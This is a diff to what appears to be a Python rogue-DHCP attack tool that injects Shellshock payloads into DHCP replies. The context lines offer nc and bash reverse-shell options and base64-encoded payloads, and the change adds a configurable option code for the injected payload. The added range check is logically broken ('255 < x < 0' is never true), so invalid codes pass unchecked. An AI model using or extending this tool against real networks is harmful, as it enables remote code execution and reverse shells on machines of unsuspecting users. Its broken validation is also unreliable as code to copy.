@@ -26,8 +26,10 @@ parser.add_argument('-N', '--nc_reverse_shell', action='store_true', help='Use n
 parser.add_argument('-E', '--nce_reverse_shell', action='store_true', help='Use nc -e reverse tcp shell in DHCP client')
 parser.add_argument('-R', '--bash_reverse_shell', action='store_true', help='Use bash reverse tcp shell in DHCP client')
 parser.add_argument('-e', '--reverse_port', type=int, help='Set port for listen bind shell (default=443)', default=443)
-parser.add_argument('-n', '--without_network', action='store_true', help='do not add network configure in payload')
-parser.add_argument('-B', '--without_base64', action='store_true', help='do not use base64 encode in payload')
+parser.add_argument('-n', '--without_network', action='store_true', help='Do not add network configure in payload')
+parser.add_argument('-B', '--without_base64', action='store_true', help='Do not use base64 encode in payload')
+parser.add_argument('-O', '--shellshock_option_code', type=int,
+                    help='Set dhcp option code for inject shellshock payload, default=114', default=114)
 
 parser.add_argument('--ip_path', type=str, help='Set path to "ip" command, default = /bin/', default="/bin/")
 parser.add_argument('--iface_name', type=str, help='Set iface name, default = eth0', default="eth0")
@@ -117,6 +119,10 @@ if args.dns is None:
 else:
     dns_server_ip_address = args.dns
 
+if 255 < args.shellshock_option_code < 0:
+    print "Bad value in DHCP option code! This value should be in the range from 1 to 255"
+    exit(1)
+
 print "\r\nNetwork interface: " + current_network_interface
 print "First offer IP: " + args.first_offer_ip
 print "Last offer IP:" + args.last_offer_ip
@@ -141,7 +147,7 @@ def make_dhcp_offer_packet(transaction_id):
                                      router=router_ip_address,
                                      dns=dns_server_ip_address,
                                      dhcp_operation=2,
-                                     url=None)
+                                     payload=None)
 
 
 def make_dhcp_ack_packet(transaction_id, requested_ip):
@@ -158,9 +164,10 @@ def make_dhcp_ack_packet(transaction_id, requested_ip):
                                      router=router_ip_address,
                                      dns=dns_server_ip_address,
                                      dhcp_operation=5,
-                                     url=shellshock_url,
+                                     payload=shellshock_url,
                                      proxy=proxy,
-                                     domain=domain)
+                                     domain=domain,
+                                     payload_option_code=args.shellshock_option_code)
 
 
 def make_dhcp_nak_packet(transaction_id, requested_ip):
